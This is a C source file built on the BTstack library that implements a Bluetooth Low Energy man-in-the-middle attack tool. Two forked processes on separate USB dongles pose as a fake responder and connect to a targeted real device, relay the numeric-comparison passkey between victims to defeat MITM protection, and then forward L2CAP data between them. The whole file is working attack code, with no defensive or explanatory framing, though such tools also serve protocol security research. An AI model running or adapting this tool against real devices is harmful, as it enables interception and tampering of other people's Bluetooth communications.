#define __BTSTACK_FILE__ "main.c"
#define _POSIX_SOURCE


#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>

#include "btstack_debug.h"
#include "btstack_event.h"
#include "btstack_link_key_db_fs.h"
#include "btstack_memory.h"
#include "btstack_run_loop.h"
#include "btstack_run_loop_posix.h"
#include "hal_led.h"
#include "hci.h"
#include "hci_dump.h"
#include "btstack_stdin.h"
#include "btstack_audio.h"
#include "btstack_tlv_posix.h"
#include "bluetooth_data_types.h"
#include "bluetooth_company_id.h"
#include "../chipset/zephyr/btstack_chipset_zephyr.h"
#include "ble/le_device_db.h"
#include "ble/att_server.h"

#include <libusb.h>
#include <sys/wait.h>
#include <sys/types.h>

#include "profiles.h"
#include "btstack_config.h"

#define TLV_DB_PATH_PREFIX "/tmp/btstack_"
#define TLV_DB_PATH_POSTFIX ".tlv"
#define USB_MAX_PATH_LEN 7
#define FIXED_PASSKEY 123456
#define REMOTE_SERVICE 0x1111
#define MAX_NAME_LEN 31 - 9

int responder_rx;
int responder_tx;
int initiator_rx;
int initiator_tx;
bd_addr_t attacked_responder_mac;
uint8_t expect_resp_addr = 0;
int relay_mode_enabled;

static char tlv_db_path[100];
static const btstack_tlv_t * tlv_impl;
static btstack_tlv_posix_t   tlv_context;
static bd_addr_t             local_addr;
static uint8_t data_channel_buffer[TEST_PACKET_SIZE];
static uint16_t initial_credits = L2CAP_LE_AUTOMATIC_CREDITS;
hci_con_handle_t connection_handle;
uint16_t connection_id;
static uint8_t my_packet_to_forward[TEST_PACKET_SIZE];
static uint8_t partner_packet_to_forward[TEST_PACKET_SIZE];
static size_t sizeof_my_packet_to_forward;
static size_t sizeof_partner_packet_to_forward;

pid_t cpid = 1;
static btstack_packet_callback_registration_t hci_event_callback_registration;
static btstack_packet_callback_registration_t sm_event_callback_registration;

void (*ipc_read)(char *buf, size_t size);
void (*ipc_write)(char *buf, size_t size);

static const uint8_t read_static_address_command_complete_prefix[] = { 0x0e, 0x1b, 0x01, 0x09, 0xfc };
static bd_addr_t static_address;
static int using_static_address;

/* Predefines */
int btstack_main(int argc, const char * argv[]);

// const uint8_t test_adv_data[] = {
// 	// Flags general discoverable, BR/EDR not supported
// 	0x02, BLUETOOTH_DATA_TYPE_FLAGS, 0x06,
// 	// Name
// 	0x0b, BLUETOOTH_DATA_TYPE_COMPLETE_LOCAL_NAME, 'M', 'I', 'T', 'M', 'R', 'E', 'A', 'D', 'E', 'R',
// 	// Incomplete List of 16-bit Service Class UUIDs -- 1111 - only valid for testing!
// 	0x03, BLUETOOTH_DATA_TYPE_INCOMPLETE_LIST_OF_16_BIT_SERVICE_CLASS_UUIDS, 0x11, 0x11,
// };
// const uint8_t test_adv_data_len = sizeof(test_adv_data);

static void l2cap_mitm_initiator_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
	UNUSED(channel);

	bd_addr_t event_address;
	uint16_t psm;
	uint16_t temp_connection_id;
	hci_con_handle_t handle;
	char buf[1];

	switch (packet_type)
	{
		case HCI_EVENT_PACKET:
			switch (hci_event_packet_get_type(packet))
			{
				case L2CAP_EVENT_LE_INCOMING_CONNECTION:
					printf("INIT: L2CAP incoming connection\n");
					psm = l2cap_event_le_incoming_connection_get_psm(packet);
					temp_connection_id = l2cap_event_le_incoming_connection_get_local_cid(packet);
					if (psm != TSPX_le_psm)
						break;
					printf("INIT: L2CAP Accepting incoming LE connection request for 0x%02x, PSM %02x\n", temp_connection_id, psm);
					l2cap_le_accept_connection(temp_connection_id, data_channel_buffer, sizeof(data_channel_buffer), initial_credits);
					break;

				case L2CAP_EVENT_LE_CHANNEL_OPENED:
					l2cap_event_le_channel_opened_get_address(packet, event_address);
					psm = l2cap_event_le_channel_opened_get_psm(packet);
					temp_connection_id = l2cap_event_le_channel_opened_get_local_cid(packet);
					handle = l2cap_event_le_channel_opened_get_handle(packet);
					if (packet[2] == 0)
					{
						printf("INIT: L2CAP LE Data Channel successfully opened: %s, handle 0x%02x, psm 0x%02x, local connection_id 0x%02x, remote connection_id 0x%02x\n", bd_addr_to_str(event_address), handle, psm, temp_connection_id,  little_endian_read_16(packet, 15));
						connection_id = temp_connection_id;
					}
					else
					{
						printf("INIT: L2CAP LE Data Channel connection to device %s failed. status code %u\n", bd_addr_to_str(event_address), packet[2]);
					}

					ipc_write(buf, 1);
					relay_mode_enabled = 1;
					break;

				case L2CAP_EVENT_LE_CHANNEL_CLOSED:
					printf("INIT: L2CAP LE Data Channel closed\n");
					connection_id = 0;
					break;

					/* Relay messages */
				case L2CAP_EVENT_LE_CAN_SEND_NOW:
					// printf("INIT: L2CAP Can send now\n");
					if(sizeof_partner_packet_to_forward)
						l2cap_le_send_data(connection_id, (uint8_t *)partner_packet_to_forward, sizeof_partner_packet_to_forward);

					// /* Request another packet */
					// l2cap_le_request_can_send_now_event(connection_id);
					break;
			}
			break;

		case L2CAP_DATA_PACKET:
			printf("INIT: Received data: %s\n \t-> Forwarding\n", packet);
			if(sizeof_my_packet_to_forward != 0)
			{
				printf("Clash\n");
				//raise(SIGINT);
			}
			sizeof_my_packet_to_forward = size;
			memcpy(my_packet_to_forward, packet, size);
			break;
	}
}

static void l2cap_mitm_responder_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
	UNUSED(channel);

	bd_addr_t event_address;
	uint16_t psm;
	uint16_t temp_connection_id;
	hci_con_handle_t handle;
	char buf[1];

	switch (packet_type)
	{
		case HCI_EVENT_PACKET:
			switch (hci_event_packet_get_type(packet))
			{
				case L2CAP_EVENT_LE_INCOMING_CONNECTION:
					printf("RESP: L2CAP incoming connection\n");
					printf("RESP: wait for numeric comparison to complete\n");
					// ipc??
					//ipc_write(buf, 1);
					//ipc_read(buf, 1);
					psm = l2cap_event_le_incoming_connection_get_psm(packet);
					temp_connection_id = l2cap_event_le_incoming_connection_get_local_cid(packet);
					if (psm != TSPX_le_psm)
						break;
					printf("RESP: L2CAP Accepting incoming LE connection request for 0x%02x, PSM %02x\n", temp_connection_id, psm);
					l2cap_le_accept_connection(temp_connection_id, data_channel_buffer, sizeof(data_channel_buffer), initial_credits);
					break;

				case L2CAP_EVENT_LE_CHANNEL_OPENED:
					l2cap_event_le_channel_opened_get_address(packet, event_address);
					psm = l2cap_event_le_channel_opened_get_psm(packet);
					temp_connection_id = l2cap_event_le_channel_opened_get_local_cid(packet);
					handle = l2cap_event_le_channel_opened_get_handle(packet);
					if (packet[2] == 0)
					{
						printf("RESP: L2CAP LE Data Channel successfully opened: %s, handle 0x%02x, psm 0x%02x, local connection_id 0x%02x, remote connection_id 0x%02x\n", bd_addr_to_str(event_address), handle, psm, temp_connection_id,  little_endian_read_16(packet, 15));
						connection_id = temp_connection_id;
					}
					else
					{
						printf("RESP: L2CAP LE Data Channel connection to device %s failed. status code %u\n", bd_addr_to_str(event_address), packet[2]);
					}
					/* Passkey entry finished  */
					ipc_write(buf, 1);
					ipc_read(buf, 1);
					relay_mode_enabled = 1;
					break;

				case L2CAP_EVENT_LE_CHANNEL_CLOSED:
					printf("RESP: L2CAP LE Data Channel closed\n");
					connection_id = 0;
					break;

					/* Relay messages */
				case L2CAP_EVENT_LE_CAN_SEND_NOW:
					printf("INIT: L2CAP Can send now\n");
					if(sizeof_partner_packet_to_forward)
						l2cap_le_send_data(connection_id, (uint8_t *)partner_packet_to_forward, sizeof_partner_packet_to_forward);

					// /* Request another packet */
					// l2cap_le_request_can_send_now_event(connection_id);
					break;
			}
			break;

		case L2CAP_DATA_PACKET:
			printf("RESP: Received data: %s\n \t-> Forwarding\n", packet);
			if(sizeof_my_packet_to_forward != 0)
			{
				printf("Clash\n");
				//raise(SIGINT);
			}
			sizeof_my_packet_to_forward = size;
			memcpy(my_packet_to_forward, packet, size);
			break;
	}
}

static void initiator_sm_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
	UNUSED(channel);
	UNUSED(size);
	char buf[1];
	uint32_t passkey;

	if(packet_type != HCI_EVENT_PACKET)
		return;

	switch(hci_event_packet_get_type(packet))
	{
		case SM_EVENT_JUST_WORKS_REQUEST:
			printf("INIT: Just works requested\n");
			sm_just_works_confirm(sm_event_just_works_request_get_handle(packet));
			break;
		case SM_EVENT_NUMERIC_COMPARISON_REQUEST:
			printf("INIT: Confirming numeric comparison: \e[31m%d\e[0m\n\n", sm_event_numeric_comparison_request_get_passkey(packet));
			/* pass Va to responder */
			passkey = sm_event_numeric_comparison_request_get_passkey(packet);
			printf("INIT: using passkey %d\n", passkey);
			ipc_write((char*) &passkey, sizeof(uint32_t));
			/* wait for passkey finish */
			ipc_read(buf, 1);
			printf("INIT: passkey finished\n");
			sm_numeric_comparison_confirm(sm_event_passkey_display_number_get_handle(packet));
			printf("INIT: confirmed numeric comparison\n");
			break;
		case SM_EVENT_PASSKEY_DISPLAY_NUMBER:
			printf("INIT: Display Passkey: %d\n", sm_event_passkey_display_number_get_passkey(packet));
			break;
		case SM_EVENT_PASSKEY_INPUT_NUMBER:
			printf("INIT: Passkey Input requested\n");
			printf("INIT: Sending fixed passkey %d\n", FIXED_PASSKEY);
			sm_passkey_input(sm_event_passkey_input_number_get_handle(packet), FIXED_PASSKEY);
			break;
		case SM_EVENT_PAIRING_COMPLETE:
			switch (sm_event_pairing_complete_get_status(packet))
			{
				case ERROR_CODE_SUCCESS:
					printf("INIT: Pairing complete, success\n");

					//printf("INIT: Establishing L2CAP channel\n");
					l2cap_le_create_channel(&l2cap_mitm_initiator_packet_handler, connection_handle, TSPX_le_psm, data_channel_buffer, sizeof(data_channel_buffer), L2CAP_LE_AUTOMATIC_CREDITS, LEVEL_3, &connection_id);
					break;
				case ERROR_CODE_CONNECTION_TIMEOUT:
					printf("INIT: Pairing failed, timeout\n");
					break;
				case ERROR_CODE_REMOTE_USER_TERMINATED_CONNECTION:
					printf("INIT: Pairing failed, disconnected\n");
					break;
				case ERROR_CODE_AUTHENTICATION_FAILURE:
					printf("INIT: Pairing failed, reason = %u\n", sm_event_pairing_complete_get_reason(packet));
					break;
				default:
					break;
			}
			break;

		default:
			break;
	}
}


static void responder_sm_packet_handler (uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
	UNUSED(channel);
	UNUSED(size);
	hci_con_handle_t con_handle;
	bd_addr_t addr;
	char buf[1];

	switch (packet_type)
	{
		case HCI_EVENT_PACKET:
			switch (hci_event_packet_get_type(packet)) {
				case HCI_EVENT_LE_META:
					switch (hci_event_le_meta_get_subevent_code(packet)) {
						case HCI_SUBEVENT_LE_CONNECTION_COMPLETE:
							// setup new
							printf("RESP: Connection complete\n");

							/* trigger connection nummeric comparison */
							ipc_write((char *)&buf, 1);

							con_handle = hci_subevent_le_connection_complete_get_connection_handle(packet);
							connection_handle = hci_subevent_le_connection_complete_get_connection_handle(packet);
							sm_send_security_request(con_handle);
							break;
						default:
							break;
					}
					break;
				case SM_EVENT_JUST_WORKS_REQUEST:
					printf("RESP: Just Works requested\n");
					sm_just_works_confirm(sm_event_just_works_request_get_handle(packet));
					break;
				case SM_EVENT_NUMERIC_COMPARISON_REQUEST:
					// printf("RESP: Confirming numeric comparison: %d\n", sm_event_numeric_comparison_request_get_passkey(packet));
					sm_numeric_comparison_confirm(sm_event_passkey_display_number_get_handle(packet));
					break;
				case SM_EVENT_PASSKEY_DISPLAY_NUMBER:
					printf("RESP: Display Passkey\n");
					break;
				case SM_EVENT_IDENTITY_CREATED:
					sm_event_identity_created_get_identity_address(packet, addr);
					printf("RESP: Identity created\n");
					// printf("Identity created: type %u address %s\n", sm_event_identity_created_get_identity_addr_type(packet), bd_addr_to_str(addr));
					break;
				case SM_EVENT_IDENTITY_RESOLVING_SUCCEEDED:
					sm_event_identity_resolving_succeeded_get_identity_address(packet, addr);
					printf("RESP: Identity resolved\n");
					// printf("Identity resolved: type %u address %s\n", sm_event_identity_resolving_succeeded_get_identity_addr_type(packet), bd_addr_to_str(addr));
					break;
				case SM_EVENT_IDENTITY_RESOLVING_FAILED:
					sm_event_identity_created_get_address(packet, addr);
					printf("RESP: Identity resolving failed\n");
					break;
				case SM_EVENT_PAIRING_COMPLETE:
					switch (sm_event_pairing_complete_get_status(packet))
					{
						case ERROR_CODE_SUCCESS:
							printf("RESP: Pairing complete, success\n");
							/* finish numeric comparison for non l2cap */
							ipc_write(buf, 1);
							break;
						case ERROR_CODE_CONNECTION_TIMEOUT:
							printf("RESP: Pairing failed, timeout\n");
							break;
						case ERROR_CODE_REMOTE_USER_TERMINATED_CONNECTION:
							printf("RESP: Pairing faileed, disconnected\n");
							break;
						case ERROR_CODE_AUTHENTICATION_FAILURE:
							printf("RESP: Pairing failed, reason = %u\n", sm_event_pairing_complete_get_reason(packet));
							break;
						default:
							break;
					}
					break;
				default:
					break;
			}
			break;
	}
}

static void initiator_hci_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
	UNUSED(channel);
	UNUSED(size);
	bd_addr_t address;
	char buf;

	if (packet_type != HCI_EVENT_PACKET) return;
	hci_con_handle_t con_handle;

	switch (hci_event_packet_get_type(packet)) {
		case BTSTACK_EVENT_STATE:
			// BTstack activated, get started
			if (btstack_event_state_get_state(packet) == HCI_STATE_WORKING)
			{
				printf("INIT: Start scanning!\n");
				gap_set_scan_parameters(1, 0x0030, 0x0030);
				gap_start_scan();

			}
			break;
		case GAP_EVENT_ADVERTISING_REPORT:
			/* Should we provide the address on demand, no scanning results are required */
			gap_event_advertising_report_get_address(packet, address);
			uint8_t address_type = gap_event_advertising_report_get_address_type(packet);
			// uint8_t length = gap_event_advertising_report_get_data_length(packet);
			// const uint8_t * data = gap_event_advertising_report_get_data(packet);
			// printf("Advertisement event: addr-type %u, addr %s, data[%u] ",
			//   address_type, bd_addr_to_str(address), length);
			// printf_hexdump(data, length);
			// if(!ad_data_contains_uuid16(length, (uint8_t *) data, REMOTE_SERVICE))
			//	break;
			if(memcmp(address, attacked_responder_mac, sizeof(bd_addr_t)) == 0)
			{
				// printf("INIT: Found targeted remote (%s) with UUID %04x, connecting...\n", bd_addr_to_str(address), REMOTE_SERVICE);
				printf("INIT: Found targeted remote (%s) with UUID %04x\n", bd_addr_to_str(address), REMOTE_SERVICE);
				gap_stop_scan();

				/* Wait for real Initiator connecting to our Responder */
				if(!expect_resp_addr)
					ipc_read(&buf, 1);

				printf("INIT: Connecting to attack target responder\n");
				gap_connect(address, address_type);
			}
			break;
		case HCI_EVENT_LE_META:
			// wait for connection complete
			if (hci_event_le_meta_get_subevent_code(packet) != HCI_SUBEVENT_LE_CONNECTION_COMPLETE)
				break;
			con_handle = hci_subevent_le_connection_complete_get_connection_handle(packet);
			printf("INIT: Connection complete\n");
			// start pairing
			connection_handle = hci_subevent_le_connection_complete_get_connection_handle(packet);
			sm_request_pairing(con_handle);
			break;
		case HCI_EVENT_ENCRYPTION_CHANGE:
			con_handle = hci_event_encryption_change_get_connection_handle(packet);
			printf("INIT: Connection encrypted: %u\n", hci_event_encryption_change_get_encryption_enabled(packet));
			break;
		default:
			break;
	}
}


static void general_hci_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
	UNUSED(channel);
	UNUSED(size);
	if (packet_type != HCI_EVENT_PACKET) return;
	switch (hci_event_packet_get_type(packet))
	{
		case BTSTACK_EVENT_STATE:
			if (btstack_event_state_get_state(packet) != HCI_STATE_WORKING) return;
			gap_local_bd_addr(local_addr);
			if (using_static_address)
				memcpy(local_addr, static_address, 6);

			printf("INIT(GEN): BThack up and running on %s.\n", bd_addr_to_str(local_addr));
			strcpy(tlv_db_path, TLV_DB_PATH_PREFIX);
			strcat(tlv_db_path, bd_addr_to_str(local_addr));
			strcat(tlv_db_path, TLV_DB_PATH_POSTFIX);
			tlv_impl = btstack_tlv_posix_init_instance(&tlv_context, tlv_db_path);
			btstack_tlv_set_instance(tlv_impl, &tlv_context);
			break;

		case HCI_EVENT_COMMAND_COMPLETE:
			if (memcmp(packet, read_static_address_command_complete_prefix, sizeof(read_static_address_command_complete_prefix)) == 0)
			{
				reverse_48(&packet[7], static_address);
				gap_random_address_set(static_address);
				using_static_address = 1;
			}
			break;

		default:
			break;
	}
}

static void sigint_handler(int param)
{
	UNUSED(param);

	if(cpid != 0)
	{
		printf("RESP: CTRL-C - SIGINT received, shutting down..\n");
		log_info("RESP: sigint_handler: shutting down");

		btstack_stdin_reset();

		hci_power_control(HCI_POWER_OFF);
		hci_close();

		log_info("RESP: Good bye, see you.\n");

		kill(cpid, SIGKILL);
	}
	else
	{
		printf("INIT: CTRL-C - SIGINT received, shutting down..\n");
		log_info("INIT: sigint_handler: shutting down");

		btstack_stdin_reset();

		hci_power_control(HCI_POWER_OFF);
		hci_close();

		log_info("INIT: Good bye, see you.\n");
	}
	exit(0);
}

static void responder_set_custom_passkey(uint32_t* tk)
{
	printf("RESP: old tk %d\n", *tk);

	/* Waiting for Va */
	ipc_read((char*) tk, sizeof(uint32_t));

	if (*tk < 100000)
	{
		printf("RESP: passkey has leading 0, abort\n");
		raise(SIGINT);
	}
	printf("RESP: new tk %d\n", *tk);
}

static void forward_packages(void)
{
        if(!relay_mode_enabled)
                return;

        /* Synchronize with other process */
        ipc_write((char *)&sizeof_my_packet_to_forward, sizeof(size_t));
        ipc_write((char *)my_packet_to_forward, sizeof_my_packet_to_forward);
        sizeof_my_packet_to_forward = 0;

        /* Receive what to forward (if any) */
        ipc_read((char *)&sizeof_partner_packet_to_forward, sizeof(ssize_t));
        if(sizeof_partner_packet_to_forward > 0)
        {
                ipc_read((char *)partner_packet_to_forward, sizeof_partner_packet_to_forward);
                l2cap_le_request_can_send_now_event(connection_id);
        }
}

static void responder_register_mitm_options(void)
{
	struct SmMitmOptions* mitm_options = calloc(1, sizeof(struct SmMitmOptions));
	//mitm_options->responder_pub_key_received_callback = &responder_pub_key_received;
	mitm_options->responder_set_custom_passkey_callback = &responder_set_custom_passkey;
	sm_register_mitm_options(mitm_options);
}

static void initiator_register_mitm_options(void)
{
	struct SmMitmOptions* mitm_options = calloc(1, sizeof(struct SmMitmOptions));
	sm_register_mitm_options(mitm_options);
}

static void initiator_ipc_read(char *buf, size_t size)
{
	if((size_t)read(initiator_rx, buf, size) != size)
	{
		printf("INIT: IPC read error\n");
		//raise(SIGINT);
	}
}

static void initiator_ipc_write(char *buf, size_t size)
{
	if((size_t)write(initiator_tx, buf, size) != size)
	{
		printf("INIT: IPC write error\n");
		//raise(SIGINT);
	}
}

static void responder_ipc_read(char *buf, size_t size)
{
	if((size_t)read(responder_rx, buf, size) != size)
	{
		printf("RESP: IPC read error\n");
		//raise(SIGINT);
	}
}

static void responder_ipc_write(char *buf, size_t size)
{
	if((size_t)write(responder_tx, buf, size) != size)
	{
		printf("RESP: IPC write error\n");
		//raise(SIGINT);
	}
}

int main(int argc, const char * argv[])
{
	char pklg_path[100];
	uint8_t initiator_usb_device_id;
	uint8_t responder_usb_device_id;
	char address_str[100];
	uint8_t *adv_data;
	uint8_t adv_data_len;
	uint8_t local_name_len;
	int pipe_fd[2];
	char buf;


	/* Parse arguments */
	if(argc < 4)
	{
		printf("Error: Too few arguments provided\n");
		printf("Usage:./%s initiator_device_id responder_device_id mitm_responder_name (for scanning: attacked_responder_mac[aa:bb:cc:dd:ee:ff])\n", argv[0]);
		exit(0);
	}
	initiator_usb_device_id = strtol(argv[1], 0, 10);
	responder_usb_device_id = strtol(argv[2], 0, 10);
	local_name_len = strlen(argv[3]);

	if(local_name_len > MAX_NAME_LEN)
	{
		printf("Error: Provided MitM-Responder name too long (max %d)\n", MAX_NAME_LEN);
		exit(0);
	}

	/* Construcing advertisement packet */
	adv_data_len = local_name_len + 9;
	adv_data = malloc(adv_data_len);
	adv_data[0] = 0x02;
	adv_data[1] = BLUETOOTH_DATA_TYPE_FLAGS;
	adv_data[2] = 0x06;
	adv_data[3] = local_name_len + 1;
	adv_data[4] = BLUETOOTH_DATA_TYPE_COMPLETE_LOCAL_NAME;
	memcpy(adv_data + 5, argv[3], local_name_len);
	adv_data[local_name_len + 5 + 1] = 0x03;
	adv_data[local_name_len + 5 + 2] = BLUETOOTH_DATA_TYPE_INCOMPLETE_LIST_OF_16_BIT_SERVICE_CLASS_UUIDS;
	adv_data[local_name_len + 5 + 3] = 0x11;
	adv_data[local_name_len + 5 + 4] = 0x11;

	if(argc == 5)
	{
		if(sscanf_bd_addr(argv[4], attacked_responder_mac) == 0)
		{
			printf("Error: MAC provided appears invalid\n");
			exit(0);
		}
	}
	else
	{
		expect_resp_addr = 1;
	}

	signal(SIGINT, sigint_handler);

	printf("Forking Initiator process\n");
	pipe(pipe_fd);
	responder_tx = pipe_fd[1];
	initiator_rx = pipe_fd[0];
	pipe(pipe_fd);
	initiator_tx = pipe_fd[1];
	responder_rx = pipe_fd[0];
	cpid = fork();

	/* Turn on line buffering for stdout (interaction with python scripts) */
	setvbuf(stdout, 0, _IOLBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	btstack_memory_init();
	/* Registering loop callback for packet forwarding later */
	btstack_run_loop_posix_register_loop_callback(forward_packages);
	btstack_run_loop_init(btstack_run_loop_posix_get_instance());

	if(cpid == 0)
		hci_transport_usb_set_address(initiator_usb_device_id);
	else
		hci_transport_usb_set_address(responder_usb_device_id);

	/* Logger */
	if(cpid == 0)
		strcpy(pklg_path, "/tmp/hci_dump_initiator");
	else
		strcpy(pklg_path, "/tmp/hci_dump_responder");
	strcat(pklg_path, ".pklg");
	printf("Packet Log: %s\n", pklg_path);
	hci_dump_open(pklg_path, HCI_DUMP_PACKETLOGGER);

	hci_init(hci_transport_usb_instance(), NULL);

	if(cpid == 0) /* Initiator (child) */
	{
		/* Configure InterProcessComms */
		ipc_read = initiator_ipc_read;
		ipc_write = initiator_ipc_write;

		l2cap_init();
		le_device_db_init();

		initiator_register_mitm_options();

		sm_init();

		/* setup ATT server */
		att_server_init(initiator_profile_data, NULL, NULL);

		/**
		 * Choose ONE of the following configurations
		 * Bonding is disabled to allow for repeated testing. It can be enabled with SM_AUTHREQ_BONDING
		 */

		// register handler
		hci_event_callback_registration.callback = &initiator_hci_packet_handler;
		hci_add_event_handler(&hci_event_callback_registration);

		sm_event_callback_registration.callback = &initiator_sm_packet_handler;
		sm_add_event_handler(&sm_event_callback_registration);

		/* LE Secure Connections, Numeric Comparison */
		sm_set_io_capabilities(IO_CAPABILITY_DISPLAY_YES_NO);
		sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION|SM_AUTHREQ_MITM_PROTECTION);

		hci_power_control(HCI_POWER_ON);
		printf("INIT: Initialized\n");


		if(expect_resp_addr)
		{
			/* Wait for real Initiator connecting to our Responder */
			ipc_read(&buf, 1);
			printf("Init: Please provide responder MAC:\n");
			fgets(address_str, 100, stdin);
			if(sscanf_bd_addr(address_str, attacked_responder_mac) == 0)
			{
				printf("MAC provided appears invalid\n");
				exit(0);
			}

			printf("Init: Searching for %s\n", address_str);
		}

	}
	else /* Responder (parent) */
	{
		/* So we dont read away data from stdin */
		close(STDIN_FILENO);
		/* Configure InterProcessComms */
		ipc_read = responder_ipc_read;
		ipc_write = responder_ipc_write;

		hci_event_callback_registration.callback = &general_hci_packet_handler;
		hci_add_event_handler(&hci_event_callback_registration);

		l2cap_init();
		le_device_db_init();

		responder_register_mitm_options();
		sm_init();

		/* Register MITM L2CAP services at attack initiator */
		l2cap_register_packet_handler(&l2cap_mitm_responder_packet_handler);
		l2cap_le_register_service(&l2cap_mitm_responder_packet_handler, TSPX_le_psm, LEVEL_3);

		// LE Secure Connetions, Just Works
		// sm_set_io_capabilities(IO_CAPABILITY_DISPLAY_YES_NO);
		// sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION);

		// LE Secure Connections, Numeric Comparison
		sm_set_io_capabilities(IO_CAPABILITY_DISPLAY_ONLY);
		sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION|SM_AUTHREQ_MITM_PROTECTION);

		// LE Legacy Pairing, Passkey entry initiator enter, responder (us) displays
		// sm_set_io_capabilities(IO_CAPABILITY_DISPLAY_ONLY);
		// sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION|SM_AUTHREQ_MITM_PROTECTION);
		// sm_use_fixed_passkey_in_display_role(123456);

		/* setup ATT server */
		att_server_init(responder_profile_data, NULL, NULL);

		/* Setup advertisements */
		uint16_t adv_int_min = 0x0030;
		uint16_t adv_int_max = 0x0030;
		uint8_t adv_type = 0;
		bd_addr_t null_addr;
		memset(null_addr, 0, 6);
		gap_advertisements_set_params(adv_int_min, adv_int_max, adv_type, 0, null_addr, 0x07, 0x00);
		gap_advertisements_set_data(adv_data_len, (uint8_t *)adv_data);
		gap_advertisements_enable(1);

		sm_event_callback_registration.callback = &responder_sm_packet_handler;
		sm_add_event_handler(&sm_event_callback_registration);

		// Register for ATT
		att_server_register_packet_handler(responder_sm_packet_handler);

		hci_power_control(HCI_POWER_ON);
		printf("RESP: Initialized\n");
	}

	btstack_run_loop_execute();

	free(adv_data);
	return 0;
}
